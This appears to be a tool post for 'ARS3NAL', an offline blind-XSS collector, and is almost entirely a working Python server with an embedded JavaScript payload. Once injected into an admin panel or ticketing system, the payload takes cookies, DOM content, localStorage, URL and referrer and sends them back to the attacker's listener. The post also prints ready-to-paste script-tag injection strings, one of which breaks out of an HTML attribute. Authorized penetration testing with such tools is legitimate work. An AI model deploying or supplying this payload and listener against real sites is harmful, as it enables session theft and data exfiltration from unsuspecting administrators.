A fully **offline** receiver for blind XSS (when the payload fires not on you but in an admin panel / ticketing system later). It starts a local HTTP server that accepts exfiltrated data (cookie, a chunk of the DOM, localStorage, URL, referrer, User-Agent) and writes each hit as a line into a **JSONL** log with a timestamp. No external services - everything runs on your side. It includes an inline-payload generator that collects this data on the victim's side and sends it here via `fetch` or an image.

> This is a replacement for the paid Burp Collaborator / xss.report for offline work. Serve `/p.js` as an external script (`<script src=//{{LHOST}}:{{LPORT}}/p.js>`) or paste the inline snippet from `--print-payload`. The log is written to `blindxss.jsonl` next to the script.

```python
#!/usr/bin/env python3
# blindxss_server.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, json, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

LOG = "blindxss.jsonl"

# served at /p.js - collects context and beacons it back (cookie may be httpOnly -> empty)
PAYLOAD_JS = """(function(){try{
 var d={cookie:document.cookie,dom:document.documentElement.outerHTML.slice(0,4000),
  url:location.href,ref:document.referrer,
  ls:JSON.stringify(window.localStorage),origin:location.origin};
 navigator.sendBeacon('/c',JSON.stringify(d))||
  fetch('/c',{method:'POST',body:JSON.stringify(d),mode:'no-cors'});
}catch(e){new Image().src='/c?e='+encodeURIComponent(e);}})();"""

class H(BaseHTTPRequestHandler):
    def _log(self, kind, data):
        rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "kind": kind,
               "ip": self.client_address[0], "ua": self.headers.get("User-Agent", ""),
               "data": data}
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        print(f"[!] HIT {kind} from {rec['ip']}")

    def do_GET(self):
        p = urlparse(self.path)
        if p.path == "/p.js":
            self.send_response(200); self.send_header("Content-Type", "application/javascript")
            self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()
            self.wfile.write(PAYLOAD_JS.encode()); return
        if p.path == "/c":
            self._log("img", parse_qs(p.query))
        self.send_response(200); self.send_header("Content-Type", "image/gif"); self.end_headers()
        self.wfile.write(b"GIF89a")

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(n).decode("utf-8", "replace")
        try:
            data = json.loads(raw)
        except ValueError:
            data = {"raw": raw}
        self._log("beacon", data)
        self.send_response(204); self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()

    def log_message(self, *a):
        pass

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL offline blind-XSS collector")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8888)
    ap.add_argument("--print-payload", action="store_true")
    a = ap.parse_args()
    if a.print_payload:
        print(f'<script src=//{{{{LHOST}}}}:{a.port}/p.js></script>')
        print(f'"><script src=//{{{{LHOST}}}}:{a.port}/p.js></script>')
        return
    print(f"[*] listening on {a.host}:{a.port}  log -> {LOG}")
    ThreadingHTTPServer((a.host, a.port), H).serve_forever()

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 blindxss_server.py --port 8888
python3 blindxss_server.py --print-payload --port 8888   # prints snippets to paste
```
